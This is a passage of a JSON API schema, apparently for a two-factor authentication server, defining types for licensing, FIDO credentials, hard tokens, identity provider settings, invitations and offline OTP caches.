          "description": "Command line to execute for delivery of provisioning messages. Placeholders in [] will be replaced.",
          "type": "string"
        },
        "OtpCustomApp": {
          "description": "Command line to execute for delivery of OTP messages. Placeholders in [] will be replaced.",
          "type": "string"
        },
        "AttributeNameMap": {
          "description": "Mapping of used placeholders in [] to ldapDisplayName of the Active Directory attributes.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/KeyValuePairOf_String_String"
          }
        },
        "AuthorizedCommand": {
          "description": "Whether the command authorization using hash is needed.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "DeliverySettings"
    },
    "DisplayInfo": {
      "properties": {
        "LicenseId": {
          "type": "string"
        },
        "LicensePoolId": {
          "type": "string"
        },
        "Username": {
          "type": "string"
        },
        "Company": {
          "type": "string"
        },
        "Site": {
          "type": "string"
        },
        "MspCompany": {
          "type": "string"
        },
        "MspCustomer": {
          "type": "string"
        },
        "LicenseModelType": {
          "description": "License type. Possible values: 0 - traditional, 1 - freemium, 2 - subscription, 3 - msp.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3
          ]
        },
        "LicenseModelState": {
          "description": "License state. Possible values: 0 - inactive, 1 - free or trial, 2 - productive, 3 - extended, 4 - expired, 5 - suspended, 6 - unsubscribed, 7 - canceled.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5,
            6,
            7
          ]
        },
        "LicenseDescription": {
          "description": "License description. Possible values: 0 - hide, 1 - full, 2 - trial, 3 - not for resale, 4 - multiple licenses.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4
          ]
        }
      },
      "type": "object",
      "format": "DisplayInfo"
    },
    "ElasticSearchSettings": {
      "properties": {
        "Address": {
          "description": "Elasticsearch address to be used for reports.",
          "type": "string"
        },
        "Username": {
          "description": "Elasticsearch username to be used for reports.",
          "type": "string"
        },
        "Password": {
          "description": "Elasticsearch password to be used for reports.",
          "type": "string"
        },
        "CertificateHash": {
          "description": "Elasticsearch certificate hash.",
          "type": "string"
        },
        "MonthsToKeepData": {
          "description": "Number of months to keep elasticsearch data (0 means keep all). Not used in cloud.",
          "type": "integer",
          "format": "int32"
        },
        "MaxResultWindow": {
          "description": "Maximum number of returned data from elasticsearch (default 10000).",
          "type": "integer",
          "format": "int32"
        },
        "ElasticsearchVersion": {
          "description": "Elasticsearch version info. Read-only, will be ignored when attempting to set the value.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ElasticSearchSettings"
    },
    "FidoCredential": {
      "properties": {
        "UserId": {
          "description": "FIDO credential user ID.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "Descriptor": {
          "description": "FIDO credential descriptor.",
          "$ref": "#/definitions/FidoPublicKeyCredentialDescriptor"
        },
        "PublicKey": {
          "description": "FIDO credential public key.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "UserHandle": {
          "description": "FIDO credential user handle.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "SignatureCounter": {
          "description": "FIDO credential signature counter. After offline mode updates the counter, the new counter should be sent back to Authentication Server to synchronize with the credential stored on the Authentication Server.",
          "type": "number",
          "format": "uint32"
        },
        "Origin": {
          "description": "FIDO credential origin.",
          "type": "string"
        },
        "OfflineCounter": {
          "description": "How many times the credential was used in offline mode.",
          "type": "number",
          "format": "uint32"
        }
      },
      "type": "object",
      "format": "FidoCredential"
    },
    "FidoPublicKeyCredentialDescriptor": {
      "properties": {
        "Type": {
          "description": "Credential type. Possible values: 0 - public-key.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0
          ]
        },
        "Id": {
          "description": "Credential ID.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "Transports": {
          "description": "Array of credential transports. Possible values: 0 - usb, 1 - nfc, 2 - ble, 3 - internal.",
          "type": "array",
          "items": {
            "type": "integer",
            "format": "enum"
          }
        }
      },
      "type": "object",
      "format": "FidoPublicKeyCredentialDescriptor"
    },
    "FIDOSettings": {
      "properties": {
        "UserVerification": {
          "description": "FIDO2 Relying Party requirement regarding user verification (authenticators that have a second factor (e.g. PIN, biometrics)). Possible values: required, preferred, discouraged.",
          "type": "string"
        },
        "AuthenticatorAttachment": {
          "description": "FIDO2 Relying Party preferred authenticator attachment modality (bound or detachable authenticators). Possible values: <empty>, platform, cross-platform.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "FIDOSettings"
    },
    "Group": {
      "properties": {
        "Name": {
          "description": "Name to use e.g. for AllowedVpnGroup.",
          "type": "string"
        },
        "DisplayName": {
          "description": "Group display name to show in the list of possible groups.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Group"
    },
    "HardToken": {
      "properties": {
        "SerialNumber": {
          "description": "Uniquely identifies the hard token.",
          "type": "string"
        },
        "HardTokenType": {
          "description": "Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "enum": [
            1,
            2
          ]
        },
        "HardTokenTypeString": {
          "description": "Type name as string.",
          "type": "string"
        },
        "AssignedUserGuid": {
          "description": "If assigned, contains GUID of the current owner.",
          "type": "string"
        },
        "AssignedUserName": {
          "description": "If assigned, contains name of the current owner together with realm.",
          "type": "string"
        },
        "AssignedUser_Name": {
          "description": "If assigned, contains name of the current owner.",
          "type": "string"
        },
        "AssignedUser_Realm": {
          "description": "If assigned, contains realm of the current owner.",
          "$ref": "#/definitions/UserRealm_WithInfo"
        },
        "Manufacturer": {
          "description": "Hard token manufacturer.",
          "type": "string"
        },
        "Issuer": {
          "description": "Hard token issuer.",
          "type": "string"
        },
        "StartDate": {
          "description": "Validity start date.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExpiryDate": {
          "description": "Validity end date.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "CompanyGuid": {
          "description": "Company Guid.",
          "type": "string",
          "format": "guid"
        }
      },
      "type": "object",
      "format": "HardToken"
    },
    "HardTokenFilter": {
      "properties": {
        "StartDateFrom": {
          "description": "Filtering by creation time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "StartDateTo": {
          "description": "Filtering by creation time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExpirationFrom": {
          "description": "Filtering by expiration time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExpirationTo": {
          "description": "Filtering by expiration time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Manufacturer": {
          "description": "Filtering by manufacturer.",
          "type": "string"
        },
        "Issuer": {
          "description": "Filtering by issuer.",
          "type": "string"
        },
        "Assigned": {
          "description": "Filtering by assigned user.",
          "type": "string"
        },
        "SerialNumber": {
          "description": "Filtering by serialNumber.",
          "type": "string"
        },
        "Type": {
          "description": "Filtering by hard token type.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2
          ]
        },
        "OnlyAvailable": {
          "description": "Filtering by currently assigned or not assigned to a user.",
          "type": "boolean"
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "HardTokenFilter"
    },
    "HardTokenImportResult": {
      "properties": {
        "ImportedHardTokens": {
          "type": "array",
          "items": {
            "$ref": "#/definitions/HardToken"
          }
        }
      },
      "type": "object",
      "format": "HardTokenImportResult"
    },
    "HardTokenSerialNumber": {
      "properties": {
        "SerialNumber": {
          "description": "Hard token serial number.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "HardTokenSerialNumber"
    },
    "HardTokensResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered hard tokens",
          "type": "array",
          "items": {
            "$ref": "#/definitions/HardToken"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "HardTokensResponse"
    },
    "IdentityProviderConfiguration": {
      "properties": {
        "Id": {
          "description": "Unique Identity Provider configuration ID.",
          "type": "string"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "Path": {
          "description": "URL path (after SiteUrl) where the ESA Identity Provider web will be available at the Identity Provider server.",
          "type": "string"
        },
        "Enabled": {
          "description": "If the 2FA protection is enabled.",
          "type": "boolean"
        },
        "AllowNon2FaUsers": {
          "description": "If users without 2FA should be able to log in.",
          "type": "boolean"
        },
        "OriginalIdentityProvider": {
          "description": "Configuration of original Identity Provider which will be contacted by ESA Identity Provider to obtain user identity.",
          "$ref": "#/definitions/IdentityProviderConfiguration_IdentityProvider"
        },
        "ServiceProviders": {
          "description": "Configuration of Service Providers which will be allowed to use ESA Identity Provider.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/IdentityProviderConfiguration_ServiceProvider"
          }
        }
      },
      "type": "object",
      "format": "IdentityProviderConfiguration"
    },
    "IdentityProviderConfiguration_ClaimsTranslationRule": {
      "properties": {
        "RuleType": {
          "description": "0 - add (needs 2 params: Type and Constant Value), 1 - remove (needs 1 param: Type), 2 - copy (needs 2 params: From Type and To Type).",
          "type": "integer",
          "format": "int32"
        },
        "RuleParams": {
          "description": "Parameters - the count must correspond to the count needed by RuleType.",
          "type": "array",
          "items": {
            "type": "string"
          }
        }
      },
      "type": "object",
      "format": "IdentityProviderConfiguration_ClaimsTranslationRule"
    },
    "IdentityProviderConfiguration_IdentityProvider": {
      "properties": {
        "ConfigurationType": {
          "description": "0 - from metadata, 1 - manual.",
          "type": "integer",
          "format": "int32"
        },
        "MetadataUrl": {
          "description": "URL where to download Identity Provider metadata from.",
          "type": "string"
        },
        "Issuer": {
          "description": "Issuer (entity ID).",
          "type": "string"
        },
        "SingleSignOnDestination": {
          "description": "URL to be contacted when logging in.",
          "type": "string"
        },
        "SingleLogoutDestination": {
          "description": "URL to be contacted when logging out.",
          "type": "string"
        },
        "SignatureValidationCertificate": {
          "description": "Signing certificate of the Identity Provider.",
          "type": "string"
        },
        "SignRequests": {
          "description": "Whether to sign requests to the Identity Provider.",
          "type": "boolean"
        },
        "ValidateCertificate": {
          "description": "Whether to validate Identity Provider certificate.",
          "type": "boolean"
        },
        "CheckCertificateRevocation": {
          "description": "Whether to check Identity Provider certificate revocation.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "IdentityProviderConfiguration_IdentityProvider"
    },
    "IdentityProviderConfiguration_ServiceProvider": {
      "properties": {
        "DisplayName": {
          "description": "Name visible to the users.",
          "type": "string"
        },
        "ConfigurationType": {
          "description": "0 - from metadata, 1 - manual.",
          "type": "integer",
          "format": "int32"
        },
        "MetadataUrl": {
          "description": "URL where to download Service Provider metadata from.",
          "type": "string"
        },
        "Issuer": {
          "description": "Issuer (entity ID).",
          "type": "string"
        },
        "SingleSignOnDestination": {
          "description": "URL to be contacted when sending login response.",
          "type": "string"
        },
        "SingleLogoutResponseDestination": {
          "description": "URL to be contacted when sending logout response.",
          "type": "string"
        },
        "SignatureValidationCertificate": {
          "description": "Signing certificate of the Service Provider.",
          "type": "string"
        },
        "ClaimsTranslationRules": {
          "description": "Rules to use to translate claims from original Identity Provider before sending them to this Service Provider.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/IdentityProviderConfiguration_ClaimsTranslationRule"
          }
        },
        "CheckRequestsSignature": {
          "description": "Whether to check the signature of requests received from the Service Provider.",
          "type": "boolean"
        },
        "ValidateCertificate": {
          "description": "Whether to validate Service Provider certificate.",
          "type": "boolean"
        },
        "CheckCertificateRevocation": {
          "description": "Whether to check Service Provider certificate revocation.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "IdentityProviderConfiguration_ServiceProvider"
    },
    "IdentityProviderConfigurationFilter": {
      "properties": {
        "Name": {
          "description": "Filtering by client name.",
          "type": "string"
        },
        "Path": {
          "description": "Filtering by configuration path.",
          "type": "string"
        },
        "ServerId": {
          "description": "Filtering by server ID.",
          "type": "string"
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "IdentityProviderConfigurationFilter"
    },
    "IdentityProviderConfigurationsResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered Identity Provider configurations settings",
          "type": "array",
          "items": {
            "$ref": "#/definitions/IdentityProviderConfiguration"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "IdentityProviderConfigurationsResponse"
    },
    "IisAdditionalSettings": {
      "properties": {
        "ApplicationVersion": {
          "description": "Version of the IIS application.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "IisAdditionalSettings"
    },
    "InstallerParameters": {
      "properties": {
        "ESA_CONFIG_PROXY_ENABLED": {
          "description": "Possible values: 1 to enable proxy, otherwise proxy is disabled.",
          "type": "string"
        },
        "ESA_CONFIG_PROXY_PASSWORD": {
          "type": "string"
        },
        "ESA_CONFIG_PROXY_PORT": {
          "type": "string"
        },
        "ESA_CONFIG_PROXY_SERVER": {
          "type": "string"
        },
        "ESA_CONFIG_PROXY_USER": {
          "type": "string"
        },
        "ADDLOCAL": {
          "type": "string"
        },
        "REMOVE": {
          "type": "string"
        },
        "ESA_COMPUTER_CONFIG_AUTHENTICATION_SERVER_ACCESS": {
          "type": "string"
        },
        "ESA_COMPUTER_CONFIG_AUTHENTICATION_SERVER_ADDRESS": {
          "type": "string"
        },
        "ESA_COMPUTER_CONFIG_AUTHENTICATION_SERVER_ADDRESS_SECONDARY": {
          "type": "string"
        },
        "TRUSTED_CERT_HASH": {
          "type": "string"
        },
        "TRUSTED_CERT_HASH_SECONDARY": {
          "type": "string"
        },
        "ESA_CONFIG_RADIUS_PORT": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "InstallerParameters"
    },
    "Invitation": {
      "properties": {
        "Name": {
          "description": "Invitation display name.",
          "type": "string"
        },
        "Code": {
          "description": "Invitation code.. Has to be provided by the component to use this invitation.",
          "type": "string"
        },
        "Created": {
          "description": "Creation time.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Expires": {
          "description": "Creation time.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Expired": {
          "description": "If it is expired (see Expires).",
          "type": "boolean"
        },
        "UsedCount": {
          "description": "How many times it was already used.",
          "type": "number",
          "format": "uint32"
        },
        "MaxUsages": {
          "description": "How many times the invitation can be used. The same invitation can be used for multiple components.",
          "type": "number",
          "format": "uint32"
        },
        "Canceled": {
          "description": "If the invitation was manually canceled.",
          "type": "boolean"
        },
        "CreatedBy": {
          "description": "User name which created the invitation.",
          "type": "string"
        },
        "Permissions": {
          "description": "Permissions of the invitation.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            4,
            7
          ]
        },
        "CompanyGuid": {
          "description": "Company Guid.",
          "type": "string",
          "format": "guid"
        }
      },
      "type": "object",
      "format": "Invitation"
    },
    "InvitationFilter": {
      "properties": {
        "CreatedFrom": {
          "description": "Filtering by creation time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "CreatedTo": {
          "description": "Filtering by creation time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExpirationFrom": {
          "description": "Filtering by expiration time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExpirationTo": {
          "description": "Filtering by expiration time",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "InvitationCreator": {
          "description": "Filtering by user name which created the invitation.",
          "type": "string"
        },
        "InvitationName": {
          "description": "Filtering by invitation display name.",
          "type": "string"
        },
        "InvitationUsage": {
          "description": "Filtering by how many times it was already used.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "HideRevoked": {
          "description": "Filtering if the invitation was manually canceled.",
          "type": "boolean",
          "x-nullable": true
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "InvitationFilter"
    },
    "InvitationName": {
      "properties": {
        "Name": {
          "description": "Invitation Name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "InvitationName"
    },
    "InvitationsResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered invitations",
          "type": "array",
          "items": {
            "$ref": "#/definitions/Invitation"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "InvitationsResponse"
    },
    "InvitationValidResponse": {
      "properties": {
        "Valid": {
          "description": "If the invitation is valid.",
          "type": "boolean"
        },
        "Permissions": {
          "description": "If the invitation is valid, permissions of the invitation.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2,
            4,
            7
          ]
        },
        "IntegrationType": {
          "description": "Type of environment where this invitation can be used.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "InvitationValidResponse"
    },
    "KeyValuePairOf_String_String": {
      "properties": {
        "Key": {
          "type": "string"
        },
        "Value": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "KeyValuePairOf_String_String"
    },
    "LastUsedOfflineOtpHashesWithOffsets": {
      "properties": {
        "Soft": {
          "description": "Last used mobile OTP in offline mode.",
          "type": "string"
        },
        "Hard": {
          "description": "Last hard token OTP in offline mode.",
          "type": "string"
        },
        "SoftRelativeOffset": {
          "description": "Offset of last used mobile OTP in offline cache (the first OTP has offset 0).",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "HardRelativeOffset": {
          "description": "Offset of last used hard token OTP in offline cache (the first OTP has offset 0).",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "CacheKey": {
          "description": "Key returned from previous authentication.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        }
      },
      "type": "object",
      "format": "LastUsedOfflineOtpHashesWithOffsets"
    },
    "LicenseInfo": {
      "properties": {
        "Error": {
          "description": "If filled, reason why the license update did not succeed.",
          "type": "string"
        },
        "UpdatedAt": {
          "description": "Last update of the license state.",
          "type": "string",
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ProductInstance_Primary": {
          "description": "Information about primary license(s).",
          "$ref": "#/definitions/ProductInstanceInfo"
        },
        "ProductInstance_Secondary": {
          "description": "Information about secondary license(s).",
          "$ref": "#/definitions/ProductInstanceInfo"
        },
        "ApplicationCode": {
          "description": "Application specific code.",
          "type": "number",
          "format": "uint32"
        },
        "TraceID": {
          "description": "Application trace identifier for problem diagnostic purposes.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "LicenseInfo"
    },
    "LicenseParameterState2": {
      "properties": {
        "Message": {
          "description": "Message describing the current state.",
          "type": "string"
        },
        "Status": {
          "description": "Current state: 0 - license not activated, 1 - OK, 2 - warning (something will expire soon), 3 - expired but not limited yet, 4 - expired and functionality is limited, 5 - expired and functionality disabled.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5,
            6
          ]
        },
        "Constraint": {
          "description": "Which parameter influences this state: 0 - expiration date, 1 - users, 2 - OTP SMS credits, 3 - feature, 4 - all users, 5 - components,.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5
          ]
        },
        "Feature": {
          "description": "If the constraint is a feature, the feature itself.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "LicenseParameterState2"
    },
    "LicenseResource": {
      "properties": {
        "Consumed": {
          "description": "Already consumed units.",
          "type": "number",
          "format": "uint32"
        },
        "Free": {
          "description": "Free units available.",
          "type": "number",
          "format": "uint32"
        },
        "Total": {
          "description": "Total amount of units.",
          "type": "number",
          "format": "uint32"
        },
        "Offline": {
          "description": "Units available for offline activation.",
          "type": "number",
          "format": "uint32"
        }
      },
      "type": "object",
      "format": "LicenseResource"
    },
    "LicenseState2": {
      "properties": {
        "Users": {
          "description": "The current state of users usage.",
          "$ref": "#/definitions/LicenseParameterState2"
        },
        "AllUsers": {
          "description": "The current state of all users (2FA users + Non2FA users) usage.",
          "$ref": "#/definitions/LicenseParameterState2"
        },
        "Components": {
          "description": "The current state of components usage.",
          "$ref": "#/definitions/LicenseParameterState2"
        },
        "OtpSmsCredits": {
          "description": "The current state of OTP SMS credits usage.",
          "$ref": "#/definitions/LicenseParameterState2"
        },
        "ExpiryDate": {
          "description": "The current state of license expiration.",
          "$ref": "#/definitions/LicenseParameterState2"
        },
        "Features": {
          "description": "The current state of ESA features.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/LicenseParameterState2"
          }
        },
        "LicenseInfo": {
          "description": "Information about the current license(s).",
          "$ref": "#/definitions/LicenseInfo"
        },
        "LicenseActivationType": {
          "description": "Information about the type of the current license activation.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2,
            3,
            4,
            5,
            6,
            7,
            999
          ]
        },
        "ExtraMessage": {
          "description": "Extra information about the license state.",
          "type": "string"
        },
        "LocalUserUsage": {
          "description": "Information about the number of users consumed from license by this ESA instance.",
          "type": "number",
          "format": "uint32"
        },
        "CompanyGuid": {
          "description": "Company Guid.",
          "type": "string",
          "format": "guid"
        }
      },
      "type": "object",
      "format": "LicenseState2"
    },
    "LicenseStateForCompanies": {
      "properties": {
        "LicenseStates": {
          "description": "Separate license states for the Companies.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/LicenseState2"
          }
        }
      },
      "type": "object",
      "format": "LicenseStateForCompanies"
    },
    "LocalLoginSettings": {
      "properties": {
        "SafeModeEnabled": {
          "description": "Enable 2FA in safe mode.",
          "type": "boolean",
          "x-nullable": true
        },
        "ScreenLockEnabled": {
          "description": "Enable 2FA if already authenticated and only unlocking the screen.",
          "type": "boolean",
          "x-nullable": true
        },
        "UACEnabled": {
          "description": "Enable 2FA if authenticating using the UAC dialog.",
          "type": "boolean",
          "x-nullable": true
        },
        "OfflineMode": {
          "description": "How to behave if Authentication Server is not reachable: 0 - perform 2FA login using offline cache, 1 - always allow access, 2 - always deny access.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2
          ]
        },
        "AllowWithNotPossibleCredentials": {
          "description": "If to allow access in offline mode for a user which has only such authentication types enabled which cannot be used in offline mode (SMS, Push).",
          "type": "boolean",
          "x-nullable": true
        },
        "OfflineOtpsCountSetting": {
          "description": "Count of next OTPs sent to the client after successful authentication.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "LocalLoginSettings"
    },
    "ManagementAccessSettings": {
      "properties": {
        "Enabled": {
          "description": "If restricting access to management is enabled.",
          "type": "boolean"
        },
        "IpList": {
          "description": "List of IP addresses able to access server management. Authentication Server localhost has access always granted. Can be delimited by newline, ; or ,. Can be IPv4 or IPv6. Subnets (10.2.1.0/24) and ranges (10.1.1.20-10.1.1.90) can be used.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ManagementAccessSettings"
    },
    "Mrk": {
      "properties": {
        "Key": {
          "description": "The master recovery key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Mrk"
    },
    "MultiActionProgress": {
      "properties": {
        "AllItems": {
          "type": "integer",
          "format": "int32"
        },
        "Processed": {
          "type": "integer",
          "format": "int32"
        },
        "State": {
          "type": "string"
        },
        "ErrorDetail": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "MultiActionProgress"
    },
    "NotificationSettings": {
      "properties": {
        "enabled": {
          "description": "Notifications global switch.",
          "type": "boolean",
          "x-nullable": true
        },
        "enabledTypes": {
          "description": "Notification types enabled.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "emailTarget": {
          "description": "Email address receiving notifications.",
          "type": "string"
        },
        "throttling": {
          "description": "How often can a notification be sent (in minutes).",
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "NotificationSettings"
    },
    "NotificationValidation": {
      "properties": {
        "EmailValidationHash": {
          "description": "Notifications email validation hash.",
          "type": "string"
        },
        "EmailValidationStart": {
          "description": "Notifications email validation hash creation time.",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "NotificationValidation"
    },
    "OfflineFido": {
      "properties": {
        "Credentials": {
          "description": "Fido credentials.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/FidoCredential"
          }
        },
        "GlobalSettings": {
          "description": "Global settings of FIDO authentication.",
          "$ref": "#/definitions/FIDOSettings"
        },
        "Origin": {
          "description": "FIDO origin to be used at this component.",
          "type": "string"
        },
        "MetadataServiceAccessToken": {
          "description": "FIDO Alliance Metadata Service (MDS) Access Token currently configured at the Authentication Server.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "OfflineFido"
    },
    "OfflineOtpHashes": {
      "properties": {
        "Soft": {
          "description": "Next mobile application OTPs.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "Hard": {
          "description": "Next hard token OTPs.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "CacheKey": {
          "description": "Cache key to be returned back on next online authentication.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        }
      },
      "type": "object",
      "format": "OfflineOtpHashes"
    },
    "OrganizationalUnit": {
      "properties": {
        "Name": {
          "type": "string"
        },
        "StructurePath": {
          "description": "Organization Unit's structure path (LDAP ADsPath).",
          "type": "string"
        },
        "OrganizationalUnits": {
          "description": "Organization Unit's subunits.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/OrganizationalUnit"
          }
        },
        "Guid": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "OrganizationalUnit"
    },
    "OriginInfo": {
      "properties": {
        "Url": {
          "description": "Origin URL.",
          "type": "string"
        },
        "Description": {
          "description": "Description to be displayed for the admin.",
          "type": "string"
        },
        "ComponentTypes": {
          "description": "Types of components where this origin appeared.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentTypeInfo"
          }
        }
      },
      "type": "object",
      "format": "OriginInfo"
    },
    "PhoneNumberResult": {
      "properties": {
        "CheckedNumber": {
          "description": "Original number string provided for checking.",
          "type": "string"
        },
        "Status": {
          "description": "Phone number check status. Possible values: 0 - invalid, 1 - unrecognized, 2 - valid.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        },
        "Country": {
          "description": "Detected country for the provided phone number.",
          "type": "string"
        },
        "Example": {
          "description": "Example phone number.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "PhoneNumberResult"
    },
    "ProductInstanceInfo": {
      "properties": {
        "ExpiryDate": {
          "description": "License(s) aggregate expiry date.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "Resource": {
          "description": "License(s) consumption information.",
          "$ref": "#/definitions/LicenseResource"
        },
        "ThisInstanceConsume": {
          "description": "License(s) consumption by this product instance.",
          "type": "integer",
          "format": "int32"
        },
        "Non2FA": {
          "description": "Number of users without 2FA.",
          "type": "integer",
          "format": "int32"
        },
        "Components": {
          "description": "Number of components.",
          "type": "integer",
          "format": "int32"
        },
        "LimitDataCount": {
          "description": "Limit constant for Items in databse.",
          "type": "integer",
          "format": "int32"
        },
        "LimitUsersCount": {
          "description": "Limit constant for Users without 2FA.",
          "type": "integer",
          "format": "int32"
        },
        "UrlInfo": {
          "description": "License related URLs to display to user in various situations.",
          "$ref": "#/definitions/UrlInfo"
        },
        "DisplayName": {
          "description": "Name that can help user to find out particular product instance in list of all his product instances (e.g. in EBA).",
